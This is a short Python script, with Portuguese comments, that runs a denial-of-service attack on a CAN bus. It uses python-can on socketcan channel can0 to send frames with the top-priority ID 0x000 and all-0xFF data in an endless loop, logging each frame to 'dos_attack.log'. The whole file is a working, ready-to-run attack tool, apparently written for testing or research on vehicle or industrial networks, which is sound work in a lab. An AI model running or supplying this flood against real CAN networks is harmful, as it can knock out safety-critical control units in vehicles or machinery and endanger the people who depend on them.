import can
import logging

CAN_CHANNEL = 'can0'
CAN_BUSTYPE = 'socketcan'

DOS_ID = 0x000  # ID mais prioritÃ¡rio
DOS_DATA = [0xFF] * 8

# ConfiguraÃ§Ã£o do log
logging.basicConfig(
    filename="dos_attack.log",
    level=logging.INFO,
    format="%(asctime)s ID=%(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

def dos_attack():
    bus = can.interface.Bus(channel=CAN_CHANNEL, bustype=CAN_BUSTYPE)
    print("[ATAQUE] Iniciando DoS... (CTRL+C para parar)")
    try:
        while True:
            msg = can.Message(arbitration_id=DOS_ID, data=DOS_DATA, is_extended_id=False)
            bus.send(msg)
            logging.info(f"{hex(msg.arbitration_id)} DATA={' '.join(f'{b:02X}' for b in msg.data)}")
    except KeyboardInterrupt:
        print("\n[INFO] Ataque DoS interrompido.")
    finally:
        bus.shutdown()

if __name__ == "__main__":
    dos_attack()